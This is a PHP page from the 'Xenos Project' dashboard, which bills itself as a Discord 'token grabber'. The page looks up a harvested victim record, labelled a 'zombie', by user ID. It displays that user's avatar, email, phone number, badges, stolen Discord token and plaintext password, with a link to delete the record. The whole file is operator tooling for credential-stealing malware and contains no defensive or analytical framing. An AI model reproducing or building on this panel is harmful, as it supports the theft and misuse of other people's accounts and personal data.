<?php

    require_once('Inc/fonctions.php');
    global $api_password;

    if(!CheckLogin()){
        header('Location: login');
    }

    if(isset($_GET['id']) && !empty($_GET['id'])) {
        if(strlen($_GET['id']) == 18) {
            global $bdd;

            $req = $bdd->prepare('SELECT * FROM tokens WHERE `user_id` = ?');
            $req->execute(array(htmlspecialchars($_GET['id'])));
            $user = $req->fetch();

            if($req->rowCount() == 0){
                header('Location: tokens'); die();
            }
        } else {
            header('Location: tokens'); die();
        }
    } else {
        header('Location: tokens'); die();
    }

    $title = "Token";
    require('Inc/Dash.php');

?>

    <!-- Main -->
    <section class="section_main">
        <div class="main">
            <img src="assets/images/xenos.gif" alt="">
            <h1>Xenos Project</h1>
            <p>The Best Most powerfull token grabber with user interface.</p>
        </div>
    </section>

    <section class="section_zombie">
        <div id="zombie" class="zombie">
            <div class="user_infos">
            <img class="user_pfp" src="https://cdn.discordapp.com/avatars/<?=$user['user_id']?>/<?=$user['avatar']?>" alt="" srcset="">
                <div class="user_text_infos">
                    <span><?=$user['username']?> (<?=$user['user_id']?>)</span>
                    <p id="user_email"><?=$user['email']?></p>
                    <p><?=$user['phone']?></p>
                    <div class="badges">
                    <?php
                            if($user['badges'] == 1) {
                                echo '<img src="assets/badges/Staff.png" alt="" srcset="">';
                            }else if($user['badges'] == 2) {
                                echo '<img src="assets/badges/Partner.png" alt="" srcset="">';
                            }else if($user['badges'] == 4) {
                                echo '<img src="assets/badges/hypeSquad.png" alt="" srcset="">';
                            }else if($user['badges'] == 8) {
                                echo '<img src="assets/badges/BugHunter.png" alt="" srcset="">';
                            }else if($user['badges'] == 64) {
                                echo '<img src="assets/badges/Bravery.png" alt="" srcset="">';
                            }else if($user['badges'] == 128) {
                                echo '<img src="assets/badges/Brilliance.png" alt="" srcset="">';
                            }else if($user['badges'] == 256) {
                                echo '<img src="assets/badges/Balance.png" alt="" srcset="">';
                            }else if($user['badges'] == 512) {
                                echo '<img src="assets/badges/early.png" alt="" srcset="">';
                            }else if($user['badges'] == 131072) {
                                echo '<img src="assets/badges/dev.png" alt="" srcset="">';
                            }

                            if($user['nitro_badges'] == 1) {
                                echo '<img src="assets/badges/Nitro_cl.png" alt="" srcset="">';
                            }else if($user['nitro_badges'] == 2) {
                                echo '<img src="assets/badges/Nitro_cl.png" alt="" srcset="">';
                                echo '<img src="assets/badges/Nitro_Boost.png" alt="" srcset="">';
                            }
                        ?>
                    </div>
                </div>
            </div>
            <div class="personnals_infos">
                <div class="custom-input token-input">
                    <label>Token: </label>
                    <input id="user_token" disabled type="text" value="<?=$user['token']?>" class="select-input">
                </div>

                <div class="custom-input token-input">
                    <label>Password: </label>
                    <input id="user_password" disabled type="text" value="<?=$user['password']?>" class="select-input">
                </div>
                <div class="btn">
                    <a class="delete_zombie" href="api?type=removetoken&token=<?=$user['token']?>">Delete User</a>
                </div>
            </div>
        </div>
    </section>

    <footer>
        Copyright ©️ Made By <a target="_blank" href="https://github.com/KanekiWeb">Kaneki Web</a>
    </footer>
</body>
</html>